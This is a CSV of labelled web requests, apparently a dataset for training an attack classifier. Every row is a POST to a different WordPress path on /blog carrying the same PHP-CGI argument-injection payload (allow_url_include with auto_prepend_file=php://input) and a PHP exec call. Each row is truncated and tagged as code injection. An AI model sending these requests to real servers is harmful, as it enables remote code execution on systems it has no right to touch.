text,label
"POST /blog/wp-admin/images?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-admin/images?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-admin/images/browser.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-admin/load-styles.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-admin/profile.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-comments-post.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-comments-post.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-comments-post.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration/assets?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration/assets/css?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration/assets/css/my-account-layout.css?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration/assets/css/sweetalert2?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration/assets/css/sweetalert2?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration/assets/css/sweetalert2/sweetalert2.min.css?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration/assets/css/user-registration-smallscreen.css?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration/assets/css/user-registration.css?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration/assets/js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration/assets/css?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration/assets/js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration/assets/js/frontend?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration/assets/js/frontend/jquery.validate.min.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration/assets/js/frontend/my-account.min.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration/assets/js/frontend/lost-password.min.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration/assets/js/frontend?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration/assets/js/frontend/user-registration.min.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration/assets/js/inputmask?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration/assets/js/inputmask?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration/assets/js/inputmask/jquery.inputmask.bundle.min.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration/assets/js/jquery-tiptip?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration/assets/js/jquery-tiptip?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration/assets/js/jquery-tiptip/jquery.tipTip.min.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/themes?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/plugins/user-registration/assets?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/themes/twentyseventeen?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/themes?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/themes/twentyseventeen?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/themes/twentyseventeen/assets?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/themes/twentyseventeen/assets/css?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/themes/twentyseventeen/assets/css/ie8.css?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/themes/twentyseventeen/assets/images?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/themes/twentyseventeen/assets/css?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/themes/twentyseventeen/assets/images?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/themes/twentyseventeen/assets/images/header.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/themes/twentyseventeen/assets/js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/themes/twentyseventeen/assets/js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/themes/twentyseventeen/assets/js/global.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/themes/twentyseventeen/assets/js/jquery.scrollTo.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/themes/twentyseventeen/assets/js/html5.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/themes/twentyseventeen/assets/js/navigation.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/themes/twentyseventeen/assets/js/skip-link-focus-fix.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/themes/twentyseventeen/assets?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/themes/twentyseventeen/style.css?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/02020950-6e37-3272-9dbf-3093969e3563-300x200.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/11020b88-e0d1-33fa-b269-b7e9f495b02b-1024x682.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/02020950-6e37-3272-9dbf-3093969e3563.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/11020b88-e0d1-33fa-b269-b7e9f495b02b.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/1faecdf0-334c-3262-b83f-a897be68c7e2-300x239.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/1faecdf0-334c-3262-b83f-a897be68c7e2.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/27f17687-adda-3ce6-9767-0037ea74eec2.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/27f17687-adda-3ce6-9767-0037ea74eec2-300x240.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/38536cfd-4e8b-3340-b4c4-af387cc163a8-1024x682.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/38536cfd-4e8b-3340-b4c4-af387cc163a8.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/40ce1958-204f-369e-bc5a-32d63da4963f-300x240.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/3cb6ff57-160b-3c64-8413-3927d651c714.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/40ce1958-204f-369e-bc5a-32d63da4963f.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/48cf902e-a565-3e60-8512-c19e2e6a72db-300x200.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/48cf902e-a565-3e60-8512-c19e2e6a72db.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/4b6aa405-8ac7-33d8-9366-43fcef53f97a-300x239.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/4b6aa405-8ac7-33d8-9366-43fcef53f97a.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/4eb284d3-cf2e-320a-949c-44cf6c5433a9-1024x682.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/4f93f7ba-7b14-35e1-b3b0-df18897c5111.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/4eb284d3-cf2e-320a-949c-44cf6c5433a9.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/6182beef-7947-3c05-887f-c6de1c49f824.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/65521cc1-512f-3af5-a40c-ad52a8de6f29-300x240.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/65521cc1-512f-3af5-a40c-ad52a8de6f29.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/6b2fa1b9-c963-3881-90e3-4f13ffe1c2d3.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/6b2fa1b9-c963-3881-90e3-4f13ffe1c2d3-1024x682.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/6e5c5163-fca7-365f-898b-acced7ed5063-300x240.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/6e5c5163-fca7-365f-898b-acced7ed5063.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/755e6d4b-39f2-3314-89a0-c9a4d1bc3143-1024x682.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/755e6d4b-39f2-3314-89a0-c9a4d1bc3143.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/7c651b11-3631-3f9e-b728-dc11efe811c7-300x240.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/7c651b11-3631-3f9e-b728-dc11efe811c7.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
"POST /blog/wp-content/uploads/2020/04/7eb06ef2-3782-3e6a-bb62-c705e86b2eee-300x200.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",242 - Code Injection
